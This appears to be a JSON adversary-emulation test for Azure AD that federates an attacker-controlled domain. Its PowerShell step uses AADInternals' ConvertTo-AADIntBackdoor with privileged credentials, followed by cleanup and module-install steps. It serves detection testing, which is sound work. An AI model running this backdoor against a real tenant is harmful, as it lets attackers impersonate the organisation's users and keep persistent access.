{
  "id": "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7",
  "name": "Add Federation to Azure AD",
  "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n",
  "platforms": [
    "azure-ad"
  ],
  "steps": [
    {
      "id": "68340f2b-0fed-4df3-88e5-3fffe8441f60",
      "type": "execute-command",
      "data": {
        "command": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop \u003e $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"#{domain_name}\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"#{domain_name}\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5e4bd083-6155-4d95-8977-784e754296cd",
      "type": "execute-command",
      "data": {
        "command": "try {\n  Import-Module AzureAD -ErrorAction Ignore\n\n  $PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n  Connect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n  Remove-AzureADDomain -Name \"#{domain_name}\" -ErrorAction Ignore\n} catch {}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "1c8133e6-e5c0-4ebd-81c6-3dc1ea812fcd",
      "name": "Check dependency 1/1",
      "description": "AzureAD and AADInternals Powershell modules must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "e7f3d41c-f8c8-458c-b822-068bb3fdea84",
      "name": "Resolve dependency 1/1",
      "description": "AzureAD and AADInternals Powershell modules must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name AzureAD -Force\nInstall-Module -Name AADInternals -Force",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "d031ed03-c2ea-41ee-adb6-db5e621c86cd",
      "name": "Re-check dependency 1/1",
      "description": "AzureAD and AADInternals Powershell modules must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "68340f2b-0fed-4df3-88e5-3fffe8441f60",
      "p": "on-success",
      "o": "5e4bd083-6155-4d95-8977-784e754296cd"
    },
    {
      "s": "68340f2b-0fed-4df3-88e5-3fffe8441f60",
      "p": "on-failure",
      "o": "5e4bd083-6155-4d95-8977-784e754296cd"
    },
    {
      "s": "1c8133e6-e5c0-4ebd-81c6-3dc1ea812fcd",
      "p": "on-success",
      "o": "68340f2b-0fed-4df3-88e5-3fffe8441f60"
    },
    {
      "s": "1c8133e6-e5c0-4ebd-81c6-3dc1ea812fcd",
      "p": "on-failure",
      "o": "e7f3d41c-f8c8-458c-b822-068bb3fdea84"
    },
    {
      "s": "e7f3d41c-f8c8-458c-b822-068bb3fdea84",
      "p": "on-success",
      "o": "d031ed03-c2ea-41ee-adb6-db5e621c86cd"
    },
    {
      "s": "d031ed03-c2ea-41ee-adb6-db5e621c86cd",
      "p": "on-failure",
      "o": "68340f2b-0fed-4df3-88e5-3fffe8441f60"
    }
  ],
  "tags": [
    "T1484",
    "T1484.002"
  ],
  "input_arguments": [
    {
      "name": "domain_name",
      "type": "string",
      "description": "Malicious federated domain name",
      "value": "contoso.com"
    },
    {
      "name": "azure_username",
      "type": "string",
      "description": "Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles",
      "value": "bruce.wayne@contosocloud.com"
    },
    {
      "name": "azure_password",
      "type": "string",
      "description": "Password of azure_username",
      "value": "iamthebatman"
    }
  ]
}